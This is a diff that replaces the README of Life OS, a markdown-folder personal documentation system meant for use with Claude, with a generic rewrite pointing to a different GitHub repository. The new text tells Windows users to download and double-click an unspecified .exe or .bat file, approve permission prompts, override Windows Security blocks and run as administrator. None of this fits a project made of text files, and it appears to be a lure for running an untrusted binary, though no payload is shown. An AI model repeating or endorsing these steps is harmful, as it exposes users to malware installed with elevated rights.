@@ -1,88 +1,239 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Life OS Banner" width="100%">
-</p>
+# 🧠 life-os - Track your life in one place
 
-# Life OS
+[![Download life-os](https://img.shields.io/badge/Download%20life--os-blue?style=for-the-badge&logo=github)](https://github.com/divyanshrai9932-jpg/life-os)
 
-A markdown-based personal documentation system, designed to be maintained collaboratively with Claude.
+## 📥 Download
 
----
+Use this link to visit the project page and download or copy the files:
 
-## What is this?
+[https://github.com/divyanshrai9932-jpg/life-os](https://github.com/divyanshrai9932-jpg/life-os)
 
-Life OS is a structured folder of markdown files that documents your life — profile, health, career, relationships, decisions, routines, and a master timeline. Claude acts as your thought partner: maintaining files, flagging patterns, pushing back on bad decisions, and keeping everything organized.
+## ✨ What life-os does
 
-It's not a journal. It's not a to-do list. It's a living system that gets smarter the more you use it.
+life-os is a markdown-based app for keeping track of your life in one place. You can use it to record notes, goals, habits, tasks, ideas, and personal updates. It is built for people who want a simple system that is easy to read and easy to keep up to date.
 
----
+You write in plain text, so your data stays simple and portable. You can open files in common editors, move them between devices, and keep your records organized without a complex setup.
 
-## Getting started
+## 🪟 Windows setup
 
-1. [Download the ZIP](https://github.com/sanketsahu/life-os/archive/refs/heads/main.zip) and unzip it
-2. Open [Claude Cowork](https://claude.ai/cowork) on your desktop
-3. Drop the folder into Claude Cowork
-4. Claude will walk you through an onboarding flow and ask you some questions
-5. Answer them — Claude will populate your files
-6. From there, just talk. Share what's happening and Claude keeps everything updated.
+Follow these steps on a Windows PC:
 
----
+1. Open the download page:
+   [https://github.com/divyanshrai9932-jpg/life-os](https://github.com/divyanshrai9932-jpg/life-os)
 
-## Folder structure
+2. Find the download files or the latest release on the page.
 
-| Folder/File | Purpose |
-|---|---|
-| `profile.md` | Living profile — who you are, updated as things change |
-| `timeline.md` | Master chronological index of everything that happened |
-| `people.md` | Social map — family, friends, colleagues, key relationships |
-| `health/` | Diet, supplements, body metrics, doctor visits |
-| `routine/` | Daily routine, workout schedule, habits |
-| `decisions/` | One file per major decision — context, options, outcome |
-| `career/` | Projects, work plans, professional milestones |
-| `travel/` | Trip logs and plans |
-| `notes/` | Miscellaneous notes that don't fit elsewhere |
+3. Download the Windows version if one is provided.
 
----
+4. If the file is in a `.zip` format, right-click it and choose **Extract All**.
 
-## How to use it
+5. Open the extracted folder.
 
-**Just talk to Claude.** Share what's on your mind — a conversation you had, a decision you're wrestling with, a health update, a career move. Claude will:
+6. Look for the app file, such as `.exe`, or for a start file named like `start.bat` or `run.bat`.
 
-- Update the relevant files
-- Add entries to your timeline
-- Update your profile if something changed
-- Create new decision files when needed
-- Push back if it sees patterns worth naming
+7. Double-click the file to open life-os.
 
-**Examples of things to share:**
-- "I had a tough conversation with my partner today..."
-- "My doctor said my cholesterol is high..."
-- "I'm thinking about switching jobs..."
-- "I couldn't sleep last night..."
-- "Here's what happened at work today..."
-- "I'm feeling overwhelmed and I'm not sure why..."
+8. If Windows asks for permission, select **Yes**.
 
----
+## 🖥️ System requirements
 
-## Principles
+life-os runs well on most Windows systems used for daily work.
 
-**Document, don't just remember.** Writing things down creates clarity. Patterns become visible over time.
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- A screen size of 1366 × 768 or higher
+- Internet access for the first download
 
-**Decisions deserve their own files.** When you're wrestling with something, give it space. Document the context, the options, what you decided, and why. Future you will thank you.
+For the best experience, use a modern browser and a current version of Windows.
 
-**The timeline is the backbone.** Every significant event gets a timestamped entry. This is how you answer "what was I doing in April?" or "when did I make that decision?"
+## 📂 What you can store
 
-**Claude should push back.** The system is most valuable when Claude is honest — naming patterns like avoidance, overcommitting, or impulsive decisions. If you want a yes-machine, this isn't for you.
+life-os gives you a single place for daily and long-term records.
 
-**Nothing is permanent.** Files can be updated, restructured, or deleted. The system adapts to your life, not the other way around.
+- Daily notes
+- Personal goals
+- Habit logs
+- To-do lists
+- Project ideas
+- Health records
+- Mood tracking
+- Meeting notes
+- Finance notes
+- Life events
 
----
+## 🔧 How it works
 
-## Privacy
+The app uses markdown files, which are simple text files with light formatting. That means you can:
 
-Everything lives in your local folder. Nothing is uploaded anywhere unless you choose to. Claude processes your files in-session and doesn't retain them between conversations (unless you're using a tool that persists context).
+- type notes in a clean format
+- use headings, lists, and links
+- keep files readable outside the app
+- back up your data with normal file copies
+- sync your notes with cloud storage tools if you want
 
----
+This makes it easy to keep control of your own data.
 
-## Credits
+## 🗂️ Suggested folder setup
 
-Built by a human who needed to organize his life, maintained by Claude who wouldn't let him cut corners.
+A simple folder structure can help you stay organized:
+
+- `daily/` for day-by-day notes
+- `goals/` for short and long term goals
+- `habits/` for tracking routines
+- `journal/` for personal writing
+- `projects/` for work and side projects
+- `health/` for wellness notes
+- `finance/` for spending and budgeting
+
+You can change this structure to fit your life.
+
+## 🚀 First-time use
+
+After you open life-os for the first time:
+
+1. Create a new folder for your life records.
+2. Add a daily note for today.
+3. Write down three things you want to track.
+4. Add one goal for the week.
+5. Add one habit you want to repeat.
+6. Save the file.
+7. Open the file tomorrow and add a new entry.
+
+A simple routine works best. The goal is to keep your system easy to use every day.
+
+## 📝 Markdown tips
+
+If you are new to markdown, use these basic patterns:
+
+- `#` for a main title
+- `##` for a section title
+- `-` for a list item
+- `**text**` for bold text
+- `[text](link)` for links
+
+Example:
+
+## Daily Note
+- Wake up at 7:00 AM
+- Exercise for 20 minutes
+- Finish report
+- Read for 30 minutes
+
+This style keeps your notes neat and easy to scan.
+
+## 🔒 Back up your data
+
+Since life-os uses text files, backing up is simple.
+
+- Copy the folder to another drive
+- Save it in OneDrive, Google Drive, or Dropbox
+- Use a USB drive for offline backup
+- Keep one extra copy in a separate folder
+
+A backup gives you a safe copy if your main folder gets lost or changed by mistake.
+
+## 🛠️ Common issues
+
+### The app does not open
+- Make sure you extracted the zip file first
+- Check that you opened the correct file
+- Right-click the file and choose **Run as administrator** if Windows asks for it
+
+### Windows blocks the file
+- Open the file again and allow it if you trust the source
+- Check Windows Security settings if needed
+
+### Files do not save
+- Make sure you have write access to the folder
+- Save the files in a folder you created, like Documents or Desktop
+- Check that your drive is not full
+
+### Text looks broken
+- Open the file in a markdown editor or plain text editor
+- Keep file names simple and avoid special characters
+
+## 📌 Daily use example
+
+A simple daily flow can look like this:
+
+### Morning
+- Write your date
+- List your top tasks
+- Add your mood
+- Note one goal for the day
+
+### Evening
+- Mark completed tasks
+- Write what went well
+- Add one thing to improve
+- Plan the next day
+
+This keeps your notes short and useful.
+
+## 📎 File naming guide
+
+Use clear names so your records stay easy to find.
+
+Good examples:
+- `2026-04-28.md`
+- `weekly-goals.md`
+- `habit-tracker.md`
+- `health-log.md`
+
+Avoid:
+- `newfile1.md`
+- `notes-final-final.md`
+- `untitled.md`
+
+## 🧭 Best way to use life-os
+
+Keep the app simple. Use it every day, even if you only add a few lines. Small entries are easier to keep than long notes you never finish.
+
+A good setup includes:
+
+- one daily note
+- one goals file
+- one habit list
+- one review note each week
+
+That gives you a clear view of your life without too much work
+
+## 📦 Download and open again
+
+If you need to get life-os later, use this link:
+
+[https://github.com/divyanshrai9932-jpg/life-os](https://github.com/divyanshrai9932-jpg/life-os)
+
+## 🧩 Useful habits for setup
+
+- Keep files in one folder
+- Use the same note format each day
+- Back up once a week
+- Review goals every Sunday
+- Remove old notes you no longer need
+- Keep headings short and clear
+
+## 🪄 Example note template
+
+# Daily Note
+
+Date: 2026-04-28
+
+## Tasks
+- 
+- 
+- 
+
+## Notes
+- 
+
+## Habits
+- Water
+- Walk
+- Read
+
+## Reflection
+- What went well:
+- What to improve:
+- What to do tomorrow:
